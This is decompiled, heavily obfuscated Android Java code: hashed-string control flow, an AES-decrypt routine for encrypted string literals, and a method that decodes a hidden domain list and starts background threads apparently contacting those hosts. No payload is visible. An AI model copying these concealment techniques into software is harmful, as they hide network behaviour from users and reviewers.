                                    str61 = "ۘۘۦۘۡ۟ۨۘۗۡۥۧۚۘۘۙۡۚۧ۟ۨۛۙۘ۬ۥۢۢۛ۠۠ۚۦۘ۠ۤ۫ۤ۟ۡۙۧۤ۠۠ۜۤۢ۠ۖ۫ۦ";
                                    continue;
                                default:
                                    continue;
                            }
                        }
                        return Boolean.TRUE;
                    case 1766387536:
                        str4 = "ۤۥۡۨۥۖۘۥۧۖۦۜۙ۟ۤۨۘۗۢۘۘۡۖۙۖۗۤۜۢۥ۫۫ۙ";
                        break;
                }
            }
        } catch (Exception e7) {
            StringBuilder sb2 = new StringBuilder();
            h.f("MN4aXzrU1PValBUBZOqr\n", "2HGtuYtWMUk=\n", sb2, str2);
            k2.logToFloatingWindow(h.d("Sc/gsdZSyrrVvA==\n", "aSZ0KD79ZVU=\n", sb2, e7), l2.decrypt("Fw0nLHE=\n", "cn9VQwOh0gw=\n"));
            return Boolean.FALSE;
        }
    }

    public static String decrypt(String str, String str2) throws Exception {
        String str3 = "ۥۢۚۛۚۗۦۦۜۗ۬ۖۘۗۧۧۡ۫۫۬ۘۘۧۛۡۘۗۙۥ۬ۖۥۖ۟ۙۡۖۘ";
        Cipher cipher = null;
        SecretKeySpec secretKeySpec = null;
        IvParameterSpec ivParameterSpec = null;
        byte[] bArr = null;
        int length = 0;
        byte[] bArr2 = null;
        byte[] bArrDecode = null;
        while (true) {
            switch ((((str3.hashCode() ^ 7) ^ 106) ^ 629) ^ (-1586226960)) {
                case -556130432:
                    str3 = "ۚۘۤۗۖۙۧۥۘ۫ۚ۬۟ۗۖۘۖۦۥۘۜۧۡۘۗۤۡۘۨۙۘۘۨۘۗۗۜۥۡۛ۬ۡۖۘۗۦ";
                    ivParameterSpec = new IvParameterSpec(bArr2);
                    break;
                case -378745813:
                    System.arraycopy(bArrDecode, 16, bArr, 0, length);
                    str3 = "ۛۤۜۙ۟ۘۘۖۢۨۤۜۖۘۖۦۘۘۥ۬ۜۘۤۧۥۘۦۤۤۢ۫ۡۧ۫ۤ";
                    break;
                case -301784569:
                    return new String(cipher.doFinal(bArr), l2.decrypt("aji54ZE=\n", "P2z/zKl5onE=\n"));
                case 96388347:
                    System.arraycopy(bArrDecode, 0, bArr2, 0, 16);
                    str3 = "ۤۤ۟ۚۘۧۨۨۘ۟ۙۤۗۦۢۖۢ۬ۚۜۡۚۗ۬ۙۙۜۘۛۨۙۤۜۤۦۦۦۘۢۢۙۨۘ۫";
                    break;
                case 283343457:
                    str3 = "۠۬ۖۤ۬ۜۘۢۧ۫ۖۧۛ۟ۤۥۤۜۘۘۨۤۘۘۙ۠ۥۙ۠ۢۗ۟۟۬ۗ۫ۗ۬ۢۖ۠ۜۘۜۥۨۘ";
                    length = bArrDecode.length - 16;
                    break;
                case 904166865:
                    str3 = "۟ۚ۠ۡۘۛ۫۠ۦۧۜۥ۬ۘۙۜۢۚۥۘۦۢۦ۠ۥۦۧۚۙۡۗ۠۫ۖ۠ۛ";
                    break;
                case 914049726:
                    cipher = Cipher.getInstance(l2.decrypt("DtKFRf3Yx+cf3JU5i8rlrCv+uA0=\n", "T5fWar6ahMg=\n"));
                    str3 = "۫ۙۘۘۚ۫ۘۙۙۤۗۦۜۦۛ۫ۛۜۘ۟ۥۧۘۗۢۜۘۨۜۖۘۖۡۧۘۘ۠۟۟ۥۧۘ";
                    break;
                case 958968716:
                    str3 = "ۤۛۢ۬ۨۡۛ۫ۘۘۡۘۖ۟ۧ۟۫ۤۡ۬ۜۥۘۡۘۨۘ۬ۘۚ۫ۧۜۚۚ۫ۦۢۧۖۥۨۘۥۚۘۘ";
                    secretKeySpec = new SecretKeySpec(str2.getBytes(l2.decrypt("TwjlvpY=\n", "Glyjk65+x08=\n")), l2.decrypt("7CXC\n", "rWCRTtssaO0=\n"));
                    break;
                case 1067029169:
                    str3 = "ۨۨۘ۠۠ۥۚۥۡۢۦۘۗۛۦۘۙۢ۠ۖۛۖۘۥ۬ۨۘۜۨ۬ۢۤۦۘۙۖۥۘ۫ۤۥۘۛۦۡۘۨ۫ۛۢۘۢۚۨۦۘۙۤۛۗۗۜۘ";
                    bArrDecode = Base64.decode(str, 2);
                    break;
                case 1523963443:
                    cipher.init(2, secretKeySpec, ivParameterSpec);
                    str3 = "۟۠ۛۡۨ۬ۜۜ۟ۘۗۥۚۙۥۘۗۖۡۧۗۘۢ۫ۛۛ۠۟۫ۖۦۘ";
                    break;
                case 1825233032:
                    str3 = "ۘ۟ۡ۠ۖۦۘۗۦ۫ۦ۬۫ۛ۟ۨۛۖۘۚ۠ۛۢۤۡۨۘۧ۠۟ۡۘۡۤ۠ۗۦۤۤۚۖۘۗۧۡۥۚۛ۬۠ۖۧۖۘ۫۠ۙ";
                    break;
                case 1878616754:
                    str3 = "ۧۧۧۨۚ۬ۤۜۧۘۛۢۜۘۖۖۚۤۤۡ۠ۚۖۧ۟ۙۛۨۜۛۛۘ۟ۛۛۨۥۨۘ۠ۚۦ۠ۡۖۘ۬ۢۢ۫۫ۦۥۨۜۛۦ";
                    bArr2 = new byte[16];
                    break;
                case 1896926540:
                    str3 = "ۗۧ۠ۙ۠ۖۘۥ۫ۙۙۘۛ۫ۙۜۘۗ۠ۥۢۡ۠ۨ۬۬ۗ۠ۦۘۚۖۡۘۛ۫۬ۚ۫ۘۘۖۡ۠۠ۢۜۨۜۛۧۡۜۘۡۨۥۖ۬ۧ";
                    bArr = new byte[length];
                    break;
            }
        }
    }

    public static JSONObject getJsonResult() {
        while (true) {
            switch (((("ۡ۫ۜۥۤۜ۟ۛۧۡۗۧ۫۠ۚ۫ۚۤۖۥ۫۫ۦۘ۠ۤۙۗۛۡۛۧۤۜۚۛۖۥ۠ۦۜۚ".hashCode() ^ 435) ^ 420) ^ 805) ^ (-1955428037)) {
                case 653693995:
                    return b;
            }
        }
    }

    public static boolean isDebug() {
        while (true) {
            switch (((("ۤۚۡۢۖۗۖۙۙۦۦۧۤۜۤۨ۟ۦۗۙۖۘ۠۠ۡۧ۟۠۟ۘۡۤ۬۟ۗۚ۫".hashCode() ^ 296) ^ 360) ^ 299) ^ 1336763083) {
                case -828301502:
                    return c;
            }
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:4:0x001b. Please report as an issue. */
    /* JADX WARN: Type inference failed for: r4v0 */
    /* JADX WARN: Type inference failed for: r4v1, types: [java.io.Serializable, java.lang.Object[]] */
    /* JADX WARN: Type inference failed for: r4v2 */
    /* JADX WARN: Type inference failed for: r4v3 */
    /* JADX WARN: Type inference failed for: r4v4 */
    public static void startRequest(Context context, boolean z) {
        int i = 1;
        String str = "ۥۚۡۘۙۧۘۗۧۜ۬ۢۘۘ۠ۜۖۘۢۗۡۚۙۦۥۦۛۘۢۘ۬ۜ۫۬۠ۨۘۦ۫ۜۙۢۧۦۛۦۚۧۙۙۛۡۗۤۗ۫ۧ۠";
        ArrayList arrayList = null;
        String[] strArr = null;
        String[] strArr2 = null;
        ?? r4 = 0;
        String[] strArrSplit = null;
        boolean zEquals = false;
        while (true) {
            switch ((((str.hashCode() ^ 150) ^ 774) ^ 557) ^ (-1646018379)) {
                case -1853117321:
                    str = "ۙۗۜۜۧۘۜۧۜۢۦۨۘۥۘۧۘ۬۬۬ۨ۟ۡۢۘۖۗۧ۬ۘۥۖ۫۫ۖۘۡۥۜۘ";
                case -1632724948:
                    str = "ۡۚۜۘۙۗۖۘۥ۫ۖۤ۟ۡۥۦۥۘۥۤ۫۬ۤۛ۬ۨۙۧ۠ۢۤ۟ۦ۫ۚۤۗ۠";
                    zEquals = fcRuQsQrcxOAzxwEalcM.DOMAINS.equals(l2.decrypt("MzPKAaWQRXQ7M9M=\n", "aBCOTujRDDo=\n"));
                case -1151443567:
                    str = "۟ۧۨۘ۟ۛۜۘۤۤۦۘۡۗۛ۠۠ۥۨۚۚۖۜۘۤ۬ۛۛۖۘۘ۫ۘۨۘۦۖ۬ۛۦۧ";
                    r4 = strArrSplit;
                case -886634070:
                    String str2 = "ۛ۫ۖۜۨۨ۠۫ۖۖۘۘۢۙۥۘۙۛۡۢۖۛۘۜۛ۫ۖۦۘ۬۬ۢ۟۫ۜۜۜۨۘ";
                    while (true) {
                        switch (str2.hashCode() ^ (-1715587586)) {
                            case -2089411608:
                                str = "ۖۘۧۘۧۘۢۖۛۡۨۡۨۘۖۢۥۢۘ۟۫ۚۦۘۘۦۜۘۖۦۦۘۦۧ۫ۨۧۡۥ۬ۡۘۜۘۙۖۙۡۘ";
                                continue;
                            case -1498646047:
                                String str3 = "ۖۢۡۘۖ۬۠ۜۜۧۘۥۨ۟ۙۤۖۥۢۤۧۥۘۦۘۚ۠ۦۨۚۥۢ۬ۨۖۤۛۤ";
                                while (true) {
                                    switch (str3.hashCode() ^ 716337557) {
                                        case -1175080669:
                                            str3 = !zEquals ? "ۛۘ۟۬۠ۜۢ۫ۗ۟ۨۘۘۡ۠ۥۘۛۖۜۘۚۤ۬ۗۖ۠ۡۡۦۘۖۛ۬۟ۙ۬۫ۡۧۘۡۜۖۘۨۛ۟ۡۤ۬ۦۢۨۧ۠ۖۘۥۡۖ" : "ۨ۫ۢ۟ۤۡۤ۬ۜۛۘۖۘۢۡ۫ۦۥۧۧۛۗۘۦۨۚ۬ۥۨۦۗۛۙۥۙۢۡ";
                                        case -976497697:
                                            str3 = "ۥۚۙۧۛۨۘۡ۫ۗۖۥۧۤۨۨۘۨ۟ۡۜ۠ۤۛۜۘۙ۫ۖ۬۫ۨۘۢۧۤۧ۠ۢ۫ۘ۟۠ۦۗۨۚۥۦ۬ۜ";
                                        case 333126256:
                                            str2 = "ۢۜ۫ۛۦۧۘۗۧۖۗ۬ۘۙ۟۫ۧ۠۟ۙ۠ۤۢۜۛۥۢۨ۬ۚۨۗۗۘۘۥۦۘۘۚۛ۬ۨۤۥۘ";
                                            break;
                                        case 1897090165:
                                            str2 = "ۖ۠۠ۡۙ۫۬۫۟ۨۢۥۘۚۚۦۘۛۛ۬ۚۗۨ۠ۨۨ۟ۧۜۘ۠۟ۛۨۤۦۘۗۘۨۘ۟ۛۗۜۨۥ";
                                            break;
                                    }
                                }
                                break;
                            case 675688037:
                                str2 = "ۙۧۥۛۛۚۜۨ۫ۤۚ۬ۙۚۨۘۤۥۛۧ۟ۨۨۘۗۜۗ۬۠ۖۖۘۤۤ۬ۦ۟ۨۢۢۖ۫۠ۢۜۘۙۛ۠ۨ۫ۗۛۡۨۘ";
                                break;
                            case 2129766779:
                                str = "ۛۢۜۘۦۗۗۤۗۢۨۡۘۛۜۘۘۘۜۡۘۧۡۜۘ۬ۡ۫ۛۡ۠ۢۙۡۘۧۤۦۘۡ۟ۢ۬ۥۘۘ۟ۚۖۖ۟۬ۖۘۙۥۚۘۘ۟";
                                continue;
                        }
                    }
                    break;
                case -746660826:
                    String str4 = "۬ۧۡۘۗۗۖۜۥۖۧۦۢۙۤۡ۬ۨۛ۠ۥۨۘ۫ۥ۠ۤۘۘۤۛۧ۠ۗۥ۟ۘۧۡۛۙۜ";
                    while (true) {
                        switch (str4.hashCode() ^ 481705240) {
                            case 600799253:
                                str4 = "ۜۢۥۘۖۛۗۦۜ۫ۨۨۛۖۢۗ۟ۛۙۥۙۛۡۡۤۙۛۘۘۦۙۜۨۘۛۙۥۘ";
                            case 912025615:
                                String str5 = "ۜۥۗۥۛۡۘۜ۟ۖۢ۫ۥۢ۬ۘۘۡ۫۬ۨۗۢۧۡۥۘۚۥۖۘ۠ۥۡۘۜۥۚۡۙۙۛۖۥۘ۟ۡۦ۫۬۬ۢۚ۠";
                                while (true) {
                                    switch (str5.hashCode() ^ (-1380033979)) {
                                        case -1331574020:
                                            str4 = "ۜۛۧۚۜۥۗۛۦۡ۬۬۬ۡ۟ۦۜ۬ۛۤۘۦۖ۟ۖۧۥۥ۬ۙۦۘ۟۬۠";
                                            break;
                                        case 878604022:
                                            str5 = "ۙۙۜۘ۠ۘۡۚۚۙۛ۬ۙۛۙۧۧۧۡۘ۫ۢۛۤۡۦۘ۠ۛۥۘۢۖۙۜۜۚۤۧۘۘ";
                                        case 1547341291:
                                            str5 = b != null ? "ۙۚۛۦۜۡۘۙۨ۟۠ۢۦۦ۟ۜۘۨ۫۠ۧۥۢۥۥۜۗ۬۠ۜۦۧۘ۟ۥۡ۬ۛۜ" : "ۖۜۜۘۚۨۘۘ۫ۡۗۢۗۥۘ۬۠ۘ۬ۤۛۛۥۘۥۤۜۘۘۚۦۘۚۛۥۦ۬ۥۖ۠ۜۗۖ۠ۨۖ۬ۘۛۖۘ۠ۥۘۘ";
                                        case 1562000144:
                                            str4 = "ۢ۫ۤۛۜۥۖۖۘۛۛۛۤۖۢۢۙۧۨ۟ۢ۟ۨ۫ۢۢۜۘۚۘۘ۬ۢۨۘۥۙۢ";
                                            break;
                                    }
                                }
                                break;
                            case 949222978:
                                str = "ۘۡۜ۬ۢۛۦۡۢۜ۫۟ۢۜۦۗۘۨۚۗ۟۬ۙ۬۠۠ۘۢ۫۟ۙۛۛۤۜۡۜۘۦۛۖۘۛۙۙۧۡۙۥۤ۠ۢۡۘ";
                                break;
                            case 1248483973:
                                break;
                        }
                    }
                    break;
                case -503636707:
                    String str6 = "ۗۡۘۙۨۢۤۧۧۥ۟ۨۘۛۛۥۘۦۨۖۘ۠۟ۨۘۖ۠ۦۦ۬ۦۜۜۗ۟ۙۧ۫ۦۤ۫ۥ۬ۚۤ";
                    while (true) {
                        switch (str6.hashCode() ^ 755541903) {
                            case -1404166629:
                                str6 = "ۢۦۘۙ۫ۥۢ۬۬ۛۦۜۘۤۧ۠ۥۜۖۧۥۘۖۛۘۘۚۥۦۜۤۚۖ۬ۡۘۥ۬ۦ۫ۡۨۘۛۜۗ۬ۛۡۘۧۦ۬ۙ۟ۖۘۥۘۜ";
                                break;
                            case 51965101:
                                str = "ۦۜ۬ۢۥۜۘۚۢۤۤۖۜۖ۟ۧۘۖۡۖ۠ۨ۬۟ۦۙ۬۠۬ۥۘۡۥ۟ۤۚۧۥ۬ۙ۫ۤ۬ۢۦۤ۠ۧۖۘ";
                                continue;
                            case 1732492825:
                                str = "۫ۡۡۦۦۙۡ۟ۘۘ۟ۥۘۖۜ۠ۥ۟۟ۗۘۜۘۡۚۜۛۛۡۙۨۜۘۧ۬ۖۤ۫ۨۘ۟ۙۖۘ۬ۦۦۘۥۢۥۘۦۙۤ۠ۡۘ۬ۧۛ";
                                continue;
                            case 1823812115:
                                String str7 = "ۙۦۛۜ۟ۚۜۨۨۘ۫ۘۧۚ۫ۧۧۦ۟ۡۛۖۢۙۡۘۧۖ۠ۙ۫ۤ";
                                while (true) {
                                    switch (str7.hashCode() ^ 1198332130) {
                                        case -1496606642:
                                            str7 = !zEquals ? "ۚۡ۟ۚۚ۟ۤۥۙ۫ۥ۫ۖۥۘۜۜۧ۬ۥ۟۫ۡۘۨۦۥۙۜۙ۫۫ۚ۠ۤۡۘ۫ۛۡۘۥۥۗۛۥۚۡۙ۫ۦ۫ۡۤۦ" : "۟ۨۦۙۧۘۘ۟ۤۨۢۤۥ۫ۛۙۘ۠ۤۘۙۦۘۖۡ۬ۧۨ۠ۘۚۥۘۚ۟ۚۡۘۨۛۡۨۤۨ۠ۖۜۚۙ۟ۥۘۜۘۚۡۜ";
                                        case 367199281:
                                            str6 = "ۧ۬ۛۦۨۖۘۜ۟۟ۦۛۘۛۨۦۘۖۥ۬ۦۚۦۚ۫ۢۖۥۘۙۗۤۢۥۥۘۜۤۥۜۨ۬۫ۜۧۘ";
                                            break;
                                        case 375552644:
                                            str6 = "ۥۦ۟۠۫۟ۥۡۜۘۤۚۜۜۤۥۘۦۧۜۘۜۡ۠۫ۘۧۘۤۢ۠ۛۙۗ۬ۢۛۥۤۙۘۙ۟۠ۢۗۤۚۥۘۡۧ۟ۙۦۘۗ۟ۥ";
                                            break;
                                        case 459725109:
                                            str7 = "ۢۡۖۡۜۥۤۙۖۘۡ۬ۡۘۗۨۘۘۙۢۜۛۙۜۘۤۗۘۘۢۖ۠ۨۥۥۘۖۥۖۜۢۥۨۤۜۘۛۨۖۦۨۘۨۧۤ۫ۘۥۤۜۦۘ";
                                    }
                                }
                                break;
                        }
                    }
                    break;
                case -471215477:
                    strArrSplit = fcRuQsQrcxOAzxwEalcM.DOMAINS.split(l2.decrypt("5w==\n", "y59Bar5EOSE=\n"));
                    str = "۠۠۠ۤۨۖۘۚۡۙۗۨۜۘ۟ۘۡۘ۠ۢۥ۠ۛ۬ۡۤۜۛۘۤۤۢۘۘ۫ۘ۟ۦۙۨۤۘۙۙ۬ۜۗۤۜ۫ۧۜۧ۟ۜۘ۬۠ۜ";
                case -467080346:
                    new Thread(new b0(arrayList, context, !zEquals, r4, Executors.newCachedThreadPool(), i)).start();
                    str = "ۜۨۡۘۗۚۨۘۛۢۨۘ۬۬۠ۥ۬۫ۥۥۥۛۜۘۥۛۜۘۤۜۜۘۢۨۨۤۗۛ۫ۡۦۢۨۙۗۥۧۦۨۖۖ۟ۤۦۦۘۧۜۡ";
                case -453136230:
                    Collections.addAll(arrayList, r4);
                    str = "ۖۘۧۘۧۘۢۖۛۡۨۡۨۘۖۢۥۢۘ۟۫ۚۦۘۘۦۜۘۖۦۦۘۦۧ۫ۨۧۡۥ۬ۡۘۜۘۙۖۙۡۘ";
                case -193186580:
                    str = "ۛۗۘۧۛۥ۠ۛۥۡۚۨ۬ۤۧۦۜۡ۬۬ۖ۠ۡۡۘ۫ۨۥۘۥۨۧۘ";
                    r4 = strArr2;
                case 18687860:
                    str = "۟ۧۨۘ۟ۛۜۘۤۤۦۘۡۗۛ۠۠ۥۨۚۚۖۜۘۤ۬ۛۛۖۘۘ۫ۘۨۘۦۖ۬ۛۦۧ";
                case 533961944:
                    str = "ۖ۟ۦۘۗۖۥۜۥۙ۫ۤۡۘۡ۬ۨۧ۬ۘ۟ۚۛۥۧۧۧۡۧۦۥۖۘۧ۟ۥۘ۫ۗ";
                case 989961794:
                    a = true;
                    str = "ۢ۟ۨۗۧۨۘۙ۫۠ۥۗۥۘۨۨۧ۫ۦۨۘۜ۟ۥۘۥۧۥۦ۬ۥۘۧۤۜۘۛۨۦۘۙۘۢۘۢۜۛۗۥۖۚۤۖ۟ۧ";
                case 1078131146:
                    break;
                case 1424861081:
                    str = "ۗۨۘۘ۠ۥۥۘۥ۟ۘۛۜۘۢ۬ۥۘ۟ۗۘ۫۠ۥۚۨۢۦۗ۟ۦ۠ۨۗۧۙۤۡۥ";
                    strArr2 = new String[0];
                case 1434907553:
                    arrayList = new ArrayList();
                    str = "ۧۥۨۘۨۤۘۘۥۦۘۢۚۥۘ۬۟ۙۜ۠۬ۜ۬ۤ۟ۧۛۚۜۧۜۤۖ";
                case 1668952661:
                    Collections.addAll(arrayList, strArr);
                    str = "ۡۦۚۗ۟ۢۤ۟ۡۘۗۜۤۗۨۚۤ۬ۙۦۘۤ۠ۗۜۘۖۦۙۨ۟ۙ";
                case 1757388573:
                    String str8 = "ۛۖۦۘۛ۫۠۟ۤۨۘۗ۠۠ۚ۬ۤ۬۠ۤۡۖۤ۠ۚۜۘۗ۟ۢۛۘۘۛۘۜۘۨۖۥۘۛۖۛۥ۠ۘۦۘۗۧۗ";
                    while (true) {
                        switch (str8.hashCode() ^ (-1257142848)) {
                            case -1983611784:
                                break;
                            case -1458513486:
                                str = "ۡ۬ۗۥ۠ۥ۬ۜۧۘۛۘۖۛۨ۟ۥۡۤۥۨۥۘ۠ۗ۟ۘۨۜۘ۠ۙۙۙۚۤۙۘۨۢ۟ۨۦ۫ۡۘۚۘ۫ۦ۟ۖۜۦۖۘ۫ۙۧ";
                                break;
                            case -922399723:
                                String str9 = "ۢۨۚۤۛۡۘۗۜۥۘۤۧ۬ۜۙۘۘۖ۟۬۟ۘ۬ۧۜۘۘۢ۟ۗۜ۫ۥ۟ۜۘۙۖۗ۠ۛۘۗۨۚ";
                                while (true) {
                                    switch (str9.hashCode() ^ 170050112) {
                                        case -2146099944:
                                            str9 = !a ? "ۥۢۨۗ۠ۧ۫ۗۘۘۧۛۨ۬ۧ۠۬ۨۨۗۧۖ۟ۧ۫ۛۧۨۘۛۚۦۘ" : "ۜ۫ۙۥۚۤۛۨ۠ۜۧۡۘۜۦۘۦۘۨۘ۫ۦۚۙۘۦۥۛ۟ۗ۟ۜۨ۠ۙۦۢ۠";
                                        case -1415301194:
                                            str8 = "ۡ۬۬ۚ۬ۤۤۦۢۡۖۥۙۥۥۘۗۗۙ۠ۤۖۘ۫ۢۜۘۧۙۧۘ۬۠ۤۥۤۙۗ";
                                            break;
                                        case 1321295654:
                                            str9 = "ۙۛۚ۬ۧۨۘۙ۫ۛۘۗ۠۫ۚۦۗۥۘۚۡۥۘۗ۟۫ۖۚۖۘۥۡۥۘۤۤۦۧۤۖۘۗۜۦۜۦۘۖۘۖۙۘ۟";
                                        case 1593445742:
                                            str8 = "ۧۦۨ۠ۘ۠ۜۗۧۜ۟ۚۢۖۘ۬۟ۗۢۡۘ۟ۡۨۘۙ۬ۜۘ۟ۖ۬ۛۤ۠۬ۚۡ۬ۦۜ۬ۖۘۘۢۡۘۧ۟ۘۘۧۚۧۙۛ۫";
                                            break;
                                    }
                                }
                                break;
                            case 923542395:
                                str8 = "۟ۦۡۘ۫ۖۘۡۖۦۘۦۖۙۦۘۙ۬ۙۨۢۚۜۘ۬ۘۨۘۖۦۖۤۛۨ۠ۡۦۘ۠ۥۘۛۨۛۦۡۚ۟ۥ۬ۗ۫ۙ۟۟۬ۜۧۛ";
                        }
                    }
                    break;
                case 1915887359:
                    str = "ۡۚۦۘ۟۠۠ۡۜۡۘۚۨۙۤۡۚۢۡ۫ۥ۠ۖۘ۬ۧۘۙۧۚۖۜۛ۠۫۠۠ۗۦۘ";
                    strArr = i.a;
                case 1977069368:
                    String str10 = "۬ۡۤ۠ۜ۬ۚۚۘۘۤ۟ۨۨۤۗۖۢۥۘۥۡۡۤ۟۠۬۬ۗ۬ۛۨۘۖۨۧۢۨۨ۫۟۠ۙۜۤۡۧ۠ۥ۬ۡ";
                    while (true) {
                        switch (str10.hashCode() ^ 487329097) {
                            case -1237471593:
                                str10 = "ۙۦۢۖ۠۫ۘۘۗۖۘۥۘۧ۫ۢۛۦۡۖۗ۟۟ۡۤۧۙۙ۫ۖۙۨۖۛ";
                            case -478997503:
                                break;
                            case 36139491:
                                String str11 = "ۗۚۢ۫۠ۘ۬ۖۡۤۢ۠ۤۥۦ۠ۨۘ۫ۖۦۙۗۡۚۜۢ۬ۘۢ";
                                while (true) {
                                    switch (str11.hashCode() ^ 432895385) {
                                        case -1420070783:
                                            str11 = !z ? "ۗ۟۬ۙ۫۟۫ۜۥۘۛۦۧۘۧۢۛۗ۬ۘۘۦۨۛۗۘۗ۫ۗۤۢۖۤۖ۬ۚۛۥۡ۬ۢ۟ۖۧۘ" : "ۦۥۨۖۦۦۛۘ۫ۜۦ۠۬ۦۘۚۢۧۨۗۦۘۗۢۤۚۨۜۘۢۤ۬ۙۨۘۗ۫ۦۘۧ۫ۜۘۗۡۦۘ";
                                        case -1199407253:
                                            str11 = "۟۬ۜ۫۠ۥۜۜۡۘۜۜ۠ۧۛۚۚۨ۬۫۫ۖۛۙۦۘۛۘۘۘ۟۟۟";
                                        case 366313349:
                                            str10 = "ۥۥۨۦۦۖۙۡۚۡۥۘۙۡۘۘۚۢۗۡۜۧۘۗۤۙ۫ۘۚۥ۬ۘۘۢۨۧۘ۠۬۠ۧۗۤۚ۟۫۟ۥۘۥۚۡ";
                                            break;
                                        case 1891778068:
                                            str10 = "ۖۢۦۚۗۧۛ۬ۥۘۨ۬ۥۖ۫۬ۖۦۜۘۤۧۤۢۚۥۗۖۙۢۧۦۘۖۜ۟ۚۚۙۡۡۨ۠ۜۥۘ";
                                            break;
                                    }
                                }
                                break;
                            case 413900195:
                                str = "ۗ۟ۡۘ۟ۛۥۘۥۡ۠۠۫ۜۘۦ۬ۨ۫ۡۥۘ۫ۗۢۨۚۛۙ۠ۥۘۙۥۡۘ۟ۤ۠ۨۚۨۖ۟۟۟ۚۢۙۚۥۨۗۥۘ";
                                break;
                        }
                    }
                    str = "۟۟ۤ۠ۤۡۨ۟ۚۤۡۗ۫۟ۜۖ۟ۗۥۥ۫۠ۙۘۘ۬ۧ۫ۖۤۗۖۛۦ۬ۛۡۘ۠۟ۗ۟ۤۖۘۙۚۢۢ۠ۧۦۢۡۘ۠ۢۦ";
                    break;
                case 2086976961:
                    str = "ۤ۟ۨۘۜۚ۬ۛۛ۬ۤۨۙۗۥۥۜۦۜۘۖۜۙۢ۫ۦۘۙۙ۫۫ۛۥۛ۬۠ۢۥۛ";
                case 2115398036:
                    str = "ۜۨۡۘۗۚۨۘۛۢۨۘ۬۬۠ۥ۬۫ۥۥۥۛۜۘۥۛۜۘۤۜۜۘۢۨۨۤۗۛ۫ۡۦۢۨۙۗۥۧۦۨۖۖ۟ۤۦۦۘۧۜۡ";
            }
            return;
        }
    }
}
